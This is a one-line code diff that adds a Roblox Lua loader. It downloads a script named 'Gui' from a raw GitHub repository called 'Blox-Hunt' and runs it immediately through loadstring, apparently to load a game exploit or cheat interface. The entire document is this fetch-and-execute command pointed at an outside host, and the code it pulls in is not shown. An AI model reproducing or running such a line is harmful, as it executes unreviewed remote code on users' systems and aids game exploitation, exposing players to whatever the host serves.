@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/zReal-King/Blox-Hunt/main/Gui'))()
